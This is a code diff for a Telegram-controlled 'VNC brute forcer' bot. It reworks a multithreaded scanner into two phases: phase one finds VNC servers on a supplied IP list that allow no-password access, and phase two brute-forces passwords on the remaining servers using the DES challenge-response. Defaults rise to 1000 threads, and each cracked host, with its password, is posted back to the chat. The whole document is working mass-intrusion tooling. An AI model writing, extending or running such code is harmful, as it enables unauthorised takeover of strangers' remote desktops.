@@ -29,13 +29,14 @@ def format_time(seconds):
     return f"{hours}:{minutes:02d}:{secs:02d}"
 
 class VNCScanner:
-    def __init__(self, chat_id, bot, scan_threads=200, scan_timeout=2, brute_timeout=2):
+    def __init__(self, chat_id, bot, scan_threads=1000, scan_timeout=5, brute_timeout=5):
         self.chat_id = chat_id
         self.bot = bot
         self.scan_threads = scan_threads
         self.scan_timeout = scan_timeout
         self.brute_timeout = brute_timeout
         self.queue = Queue()
+        self.brute_queue = Queue()
         self.results = []
         self.lock = threading.Lock()
         self.total_servers = 0
@@ -48,6 +49,8 @@ class VNCScanner:
         self.loop = None
         self.stopped = False
         self.active_threads = 0
+        self.phase = "NULL_SCAN"
+        self.null_servers = []
         
     def load_ips(self, content):
         ips = []
@@ -63,7 +66,7 @@ class VNCScanner:
         return ips
         
     def load_passwords(self, content):
-        passwords = ['']
+        passwords = []
         for line in content.split('\n'):
             line = line.strip()
             if line and not line.startswith('#'):
@@ -72,7 +75,6 @@ class VNCScanner:
         
     def vnc_handshake(self, sock):
         try:
-            sock.settimeout(self.brute_timeout)
             version = sock.recv(12)
             if not version.startswith(b'RFB '):
                 return None, None
@@ -90,7 +92,6 @@ class VNCScanner:
             
     def get_server_name(self, sock):
         try:
-            sock.settimeout(self.brute_timeout)
             sock.recv(2)
             sock.recv(2)
             sock.recv(16)
@@ -104,18 +105,17 @@ class VNCScanner:
             pass
         return "None"
         
-    def check_vnc_auth(self, ip, port, password=""):
+    def check_vnc_null(self, ip, port):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(self.scan_timeout if not password else self.brute_timeout)
+            sock.settimeout(self.scan_timeout)
             sock.connect((ip, port))
             version, sec_types = self.vnc_handshake(sock)
             if version is None:
                 sock.close()
-                return False, None, None
+                return False, None
             if sec_types and 1 in sec_types:
                 sock.sendall(b'\x01')
-                sock.settimeout(self.brute_timeout)
                 result = sock.recv(4)
                 if len(result) == 4:
                     auth_result = struct.unpack('!I', result)[0]
@@ -123,14 +123,27 @@ class VNCScanner:
                         sock.sendall(b'\x01')
                         server_name = self.get_server_name(sock)
                         sock.close()
-                        return True, "null", server_name
-            elif sec_types and 2 in sec_types and password:
+                        return True, server_name
+            sock.close()
+            return False, None
+        except:
+            return False, None
+    
+    def check_vnc_auth(self, ip, port, password):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.brute_timeout)
+            sock.connect((ip, port))
+            version, sec_types = self.vnc_handshake(sock)
+            if version is None:
+                sock.close()
+                return False, None
+            if sec_types and 2 in sec_types:
                 sock.sendall(b'\x02')
-                sock.settimeout(self.brute_timeout)
                 challenge = sock.recv(16)
                 if len(challenge) != 16:
                     sock.close()
-                    return False, None, None
+                    return False, None
                 key = (password + '\x00' * 8)[:8].encode('latin-1')
                 response = d3des.desencrypt(key, challenge)
                 sock.sendall(response)
@@ -141,13 +154,13 @@ class VNCScanner:
                         sock.sendall(b'\x01')
                         server_name = self.get_server_name(sock)
                         sock.close()
-                        return True, password, server_name
+                        return True, server_name
             sock.close()
-            return False, None, None
-        except Exception as e:
-            return False, None, None
+            return False, None
+        except:
+            return False, None
             
-    def worker(self):
+    def null_worker(self):
         while self.running:
             try:
                 item = self.queue.get(timeout=1)
@@ -167,33 +180,62 @@ class VNCScanner:
                 self.queue.task_done()
                 break
                 
-            success, password, server_name = self.check_vnc_auth(ip, port, "")
+            success, server_name = self.check_vnc_null(ip, port)
             if success:
-                result = f"{ip}:{port}-{password}-[{server_name}]"
+                result = f"{ip}:{port}-null-[{server_name}]"
                 with self.lock:
                     self.results.append(result)
                 if self.loop:
                     asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
             else:
-                for pwd in self.passwords[1:]:
-                    if not self.running:
-                        break
-                    with self.lock:
-                        self.current_password = pwd
-                    success, password, server_name = self.check_vnc_auth(ip, port, pwd)
-                    if success:
-                        result = f"{ip}:{port}-{password}-[{server_name}]"
-                        with self.lock:
-                            self.results.append(result)
-                        if self.loop:
-                            asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
-                        break
+                with self.lock:
+                    self.null_servers.append((ip, port))
             
             with self.lock:
                 self.checked_servers += 1
                 self.active_threads -= 1
                 
             self.queue.task_done()
+    
+    def brute_worker(self):
+        while self.running:
+            try:
+                item = self.brute_queue.get(timeout=1)
+            except:
+                continue
+            if item is None:
+                break
+            
+            with self.lock:
+                self.active_threads += 1
+            
+            ip, port = item
+            
+            if not self.running:
+                with self.lock:
+                    self.active_threads -= 1
+                self.brute_queue.task_done()
+                break
+            
+            for pwd in self.passwords:
+                if not self.running:
+                    break
+                with self.lock:
+                    self.current_password = pwd
+                success, server_name = self.check_vnc_auth(ip, port, pwd)
+                if success:
+                    result = f"{ip}:{port}-{pwd}-[{server_name}]"
+                    with self.lock:
+                        self.results.append(result)
+                    if self.loop:
+                        asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
+                    break
+            
+            with self.lock:
+                self.checked_servers += 1
+                self.active_threads -= 1
+                
+            self.brute_queue.task_done()
     
     def stop(self):
         self.running = False
@@ -204,9 +246,16 @@ class VNCScanner:
                 self.queue.task_done()
             except:
                 break
+        while not self.brute_queue.empty():
+            try:
+                self.brute_queue.get_nowait()
+                self.brute_queue.task_done()
+            except:
+                break
         for _ in range(self.scan_threads):
             try:
                 self.queue.put(None)
+                self.brute_queue.put(None)
             except:
                 pass
             
@@ -228,15 +277,19 @@ class VNCScanner:
                 hits = len(self.results)
                 current_pwd = self.current_password
                 active = self.active_threads
+                phase = self.phase
             elapsed = time.time() - self.start_time
             percent = (current / total) * 100 if total > 0 else 0
             speed = current / elapsed if elapsed > 0 else 0
             remaining = (total - current) / speed if speed > 0 else 0
             
-            if current_pwd:
-                trying_text = f'Trying "{current_pwd}" on {total} servers'
+            if phase == "NULL_SCAN":
+                trying_text = f'Phase 1: Checking null passwords'
             else:
-                trying_text = f'Trying "null" on {total} servers'
+                if current_pwd:
+                    trying_text = f'Phase 2: Trying "{current_pwd}"'
+                else:
+                    trying_text = f'Phase 2: Brute forcing'
             
             text = (
                 f"<b>VNC SCANNER STATUS</b>\n"
@@ -270,15 +323,16 @@ class VNCScanner:
         self.total_servers = len(ips)
         self.start_time = time.time()
         
-        print(f"Starting scan with {len(ips)} servers and {len(self.passwords)} passwords")
+        print(f"Starting two-phase scan with {len(ips)} servers and {len(self.passwords)} passwords")
         
         text = (
-            f"<b>SCAN STARTED</b>\n\n"
+            f"<b>SCAN STARTED (TWO-PHASE MODE)</b>\n\n"
             f"<b>Total Servers:</b> {self.total_servers}\n"
             f"<b>Passwords:</b> {len(self.passwords)}\n"
             f"<b>Threads:</b> {self.scan_threads}\n"
             f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
-            f"Initializing..."
+            f"Phase 1: Null password scan\n"
+            f"Phase 2: Password brute force"
         )
         keyboard = [[InlineKeyboardButton("STOP SCAN", callback_data=f"stop_{self.chat_id}")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -290,9 +344,11 @@ class VNCScanner:
         )
         self.message_id = msg.message_id
         
+        # PHASE 1: NULL PASSWORD SCAN
+        self.phase = "NULL_SCAN"
         threads = []
         for _ in range(self.scan_threads):
-            t = threading.Thread(target=self.worker)
+            t = threading.Thread(target=self.null_worker)
             t.daemon = True
             t.start()
             threads.append(t)
@@ -307,8 +363,6 @@ class VNCScanner:
         while self.running and (not self.queue.empty() or any(t.is_alive() for t in threads)):
             await asyncio.sleep(0.5)
         
-        self.running = False
-        
         for _ in range(self.scan_threads):
             try:
                 self.queue.put(None)
@@ -317,7 +371,41 @@ class VNCScanner:
         
         for t in threads:
             t.join(timeout=1)
+        
+        # PHASE 2: BRUTE FORCE
+        if self.running and len(self.null_servers) > 0:
+            self.phase = "BRUTE_FORCE"
+            self.checked_servers = 0
+            self.total_servers = len(self.null_servers)
             
+            print(f"Phase 2: Brute forcing {len(self.null_servers)} servers")
+            
+            threads = []
+            for _ in range(self.scan_threads):
+                t = threading.Thread(target=self.brute_worker)
+                t.daemon = True
+                t.start()
+                threads.append(t)
+                
+            for ip_info in self.null_servers:
+                if not self.running:
+                    break
+                self.brute_queue.put(ip_info)
+                
+            while self.running and (not self.brute_queue.empty() or any(t.is_alive() for t in threads)):
+                await asyncio.sleep(0.5)
+            
+            for _ in range(self.scan_threads):
+                try:
+                    self.brute_queue.put(None)
+                except:
+                    pass
+            
+            for t in threads:
+                t.join(timeout=1)
+        
+        self.running = False
+        
         try:
             await asyncio.wait_for(update_task, timeout=2)
         except:
@@ -325,12 +413,11 @@ class VNCScanner:
         
         elapsed = time.time() - self.start_time
         
-        print(f"Scan finished: {self.checked_servers} servers in {elapsed:.2f}s")
+        print(f"Scan finished: {len(self.results)} hits in {elapsed:.2f}s")
         
         if self.stopped:
             text = (
                 f"<b>SCAN STOPPED</b>\n\n"
-                f"<b>Total Checked:</b> {self.checked_servers}/{self.total_servers}\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
                 f"Scan was stopped by user"
@@ -338,7 +425,6 @@ class VNCScanner:
         else:
             text = (
                 f"<b>SCAN COMPLETED</b>\n\n"
-                f"<b>Total Checked:</b> {self.checked_servers}\n"
                 f"<b>Hits Found:</b> {len(self.results)}\n"
                 f"<b>Time Elapsed:</b> {format_time(elapsed)}\n\n"
                 f"Results saved to file"
@@ -389,7 +475,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     reply_markup = InlineKeyboardMarkup(keyboard)
     text = (
-        "<b>VNC BRUTE FORCER BOT</b>\n\n"
+        "<b>VNC BRUTE FORCER BOT (TWO-PHASE)</b>\n\n"
         "Select an option to continue"
     )
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
@@ -421,9 +507,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id] = {}
         if "settings" not in user_states[user_id]:
             user_states[user_id]["settings"] = {
-                "threads": 200,
-                "scan_timeout": 2,
-                "brute_timeout": 2
+                "threads": 1000,
+                "scan_timeout": 5,
+                "brute_timeout": 5
             }
         current_settings = user_states[user_id]["settings"]
         keyboard = [
@@ -434,7 +520,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Bot scans all VNC ports (5900-5905) automatically",
+            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Bot uses two-phase scanning (null first, then brute)",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -485,7 +571,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>VNC BRUTE FORCER BOT</b>\n\nSelect an option",
+            "<b>VNC BRUTE FORCER BOT (TWO-PHASE)</b>\n\nSelect an option",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -527,9 +613,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             if "settings" not in state:
                 state["settings"] = {
-                    "threads": 200,
-                    "scan_timeout": 2,
-                    "brute_timeout": 2
+                    "threads": 1000,
+                    "scan_timeout": 5,
+                    "brute_timeout": 5
                 }
             settings = state["settings"]
             
@@ -553,9 +639,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             value = int(update.message.text)
             if "settings" not in state:
                 state["settings"] = {
-                    "threads": 200,
-                    "scan_timeout": 2,
-                    "brute_timeout": 2
+                    "threads": 1000,
+                    "scan_timeout": 5,
+                    "brute_timeout": 5
                 }
             state["settings"][setting] = value
             user_states[user_id] = state
@@ -602,7 +688,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.ALL, handle_message))
     
-    print("Bot started")
+    print("Bot started - Two-Phase VNC Scanner")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
